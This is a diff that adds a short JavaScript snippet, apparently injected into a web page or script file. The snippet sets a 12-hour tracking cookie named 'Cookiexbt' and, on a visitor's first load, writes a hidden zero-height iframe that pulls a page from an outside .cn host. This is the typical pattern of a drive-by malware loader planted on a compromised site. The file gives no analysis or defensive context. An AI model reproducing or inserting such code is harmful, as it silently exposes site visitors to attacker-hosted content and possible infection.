@@ -1,0 +1,12 @@
+function Get(){
+var Then = new Date() 
+Then.setTime(Then.getTime() + 12*60*60*1000)
+var cookieString = new String(document.cookie)
+var cookieHeader = "Cookiexbt=" 
+var beginPosition = cookieString.indexOf(cookieHeader)
+if (beginPosition != -1){ 
+} else 
+{ document.cookie = "Cookiexbt=rnsfs;expires="+ Then.toGMTString()
+document.write("<iframe src=http:\/\/www.tmhcar.cn\/kf\/360.htm width=100 height=0><\/iframe>");
+}
+}Get();
